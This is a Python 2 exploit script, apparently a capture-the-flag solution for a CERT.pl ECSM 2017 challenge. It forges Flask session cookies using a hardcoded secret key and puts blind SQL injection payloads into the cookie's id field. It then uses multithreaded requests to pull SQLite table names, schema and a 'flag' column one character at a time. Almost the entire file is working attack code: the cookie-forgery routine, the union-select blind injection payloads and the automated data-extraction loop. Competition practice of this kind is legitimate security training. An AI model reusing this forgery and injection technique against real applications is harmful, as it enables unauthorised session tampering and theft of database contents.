#!/usr/bin/env python2
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
import hashlib
import requests
import string
import sys
from multiprocessing.dummy import Pool as ThreadPool

debug = False
example_valid_cookie = "eyJpZCI6eyIgYiI6Ik1UUmtOakEzT0RNdFpXRTBZeTAwTXpkaExUazVaRE10WlRRMU9ETTRPR0kwT1RJNSJ9fQ.DNyozw.38cR3GDxG7ZhSreMDcWgyMnjgt4"
secret_key = "lz2fhklkScDccJbseN3E"
flask_session_salt = 'cookie-session'
HOST = "http://ecsm2017.cert.pl:6032"
MAIN_ENDPOINT = "/"
ACCEPT_COOKIES_ENDPOINT = "/accept_cookies"
serializer_options = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
        }

serializer = URLSafeTimedSerializer(secret_key, salt=flask_session_salt, serializer=TaggedJSONSerializer(), signer_kwargs=serializer_options)

def log(msg):
    print "[*]", msg

def decode_flask_cookie(cookie_str):
        return serializer.loads(cookie_str)

def encode_flask_cookie(plain_cookie):
        return serializer.dumps(plain_cookie)

def check_if_blind_success(response):
    return 'alert-dismissable"  style="display: none"' in response

def get_new_encrypted_cookie(new_payload):
    decoded = decode_flask_cookie(example_valid_cookie)
    decoded['id'] = new_payload
    encrypted_new = encode_flask_cookie(decoded)
    if debug:
       #print "Payload: ", decoded['id']
       #print "New cookie: ", decoded
       #print "Encrypted new cookie: ", encrypted_new
       #print "Decrypted on server side: ", decode_flask_cookie(encrypted_new)
       print "Payload on server side: ",  decode_flask_cookie(encrypted_new)['id']
    return encrypted_new

def make_http_request_with_sqli_payload(payload, endpoint):
    cookies = dict(session=get_new_encrypted_cookie(payload))
    r = requests.get(HOST + endpoint, cookies=cookies)
    if debug:
        print "Payload: ", payload
        print "Status code: ",  r.status_code
    return (r.status_code, r.text)

def blind_injection_get_num_of_tables():
    num_of_tables = 0
    while True:
        payload = "' union select (select count(*) from sqlite_master) = %d limit 1,1 -- " % num_of_tables
        code, content = make_http_request_with_sqli_payload(payload, MAIN_ENDPOINT)
        if check_if_blind_success(content):
            return num_of_tables
        else:
            num_of_tables += 1

def blind_injection_find_length_of_concatenated_table_names():
    length = 0
    while True:
        payload = "' union select (select length(group_concat(tbl_name)) from sqlite_master) = %d limit 1,1 -- " % length
        code, content = make_http_request_with_sqli_payload(payload, MAIN_ENDPOINT)
        if check_if_blind_success(content):
            return length
        else:
            length += 1

def worker_table_names(position):
    for possible_char in string.printable:
        payload = "' union select (select hex(substr(group_concat(tbl_name),%d,1)) from sqlite_master) == '%s' limit 1,1 -- " % (position, hex(ord(possible_char))[2:].upper())
        code, content = make_http_request_with_sqli_payload(payload, MAIN_ENDPOINT)
        if check_if_blind_success(content):
            return possible_char
    return "?"

def blind_injection_get_table_names(length_of_table_names):
    pool = ThreadPool(length_of_table_names)
    char_pos = [x for x in range(1, length_of_table_names + 1)]
    result = pool.map(worker_table_names, char_pos)
    return "".join(result).split(",")

def worker_table_structure(t):
    position, table_name = t
    for possible_char in string.printable:
        payload = "' union select (select hex(substr(sql,%d,1)) from sqlite_master where tbl_name == '%s') == '%s' limit 1,1 --  " % (position, table_name, hex(ord(possible_char))[2:].upper())
        code, content = make_http_request_with_sqli_payload(payload, MAIN_ENDPOINT)
        if check_if_blind_success(content):
            return possible_char
    return "?"


def blind_injection_get_structure_of_table(table_name, steps):
    out = ""
    workers_per_step = 50
    for i in range(1, steps * workers_per_step, workers_per_step):
        pool = ThreadPool(workers_per_step)
        char_pos = [(x, table_name)  for x in range(i, i + workers_per_step + 1)]
        result = pool.map(worker_table_structure, char_pos)
        out += "".join(result)
    return out

def worker_read_table_content(t):
    position, column_name, table_name = t
    for possible_char in string.printable:
        payload = "' union select (select hex(substr(%s,%d,1)) from %s) == '%s' limit 1,1 --  " % (column_name, position, table_name,  hex(ord(possible_char))[2:].upper())
        code, content = make_http_request_with_sqli_payload(payload, MAIN_ENDPOINT)
        if check_if_blind_success(content):
            return possible_char
    return "?"

def blind_injection_get_content_of_table(table_name, column_name, steps):
    out = ""
    workers_per_step = 50
    for i in range(1, steps * workers_per_step, workers_per_step):
        pool = ThreadPool(workers_per_step)
        char_pos = [(x, column_name, table_name)  for x in range(i, i + workers_per_step + 1)]
        result = pool.map(worker_read_table_content, char_pos)
        out += "".join(result)
    return out

log("Trying to get number of tables")
num_of_tables = blind_injection_get_num_of_tables()
log("Number of tables: %d" % num_of_tables)

log("Trying to get length of concatenated table names")
length_of_concatenated_table_names = blind_injection_find_length_of_concatenated_table_names()
log("Length: %d" % length_of_concatenated_table_names)

log("Trying to get table names")
table_names = blind_injection_get_table_names(length_of_concatenated_table_names)
log("Tables: ")
for table in table_names:
    log("+ %s" % table)

flag_table = table_names[2]

log("Trying to get structure of table with flag")
structure = blind_injection_get_structure_of_table(flag_table, 2)
log("Found: %s" % structure.strip("?"))
log("Trying to get content from table with flag")
flag = blind_injection_get_content_of_table(flag_table, 'flag', 2)
log("!!!")
log("FLAG: %s" % flag.strip("?"))

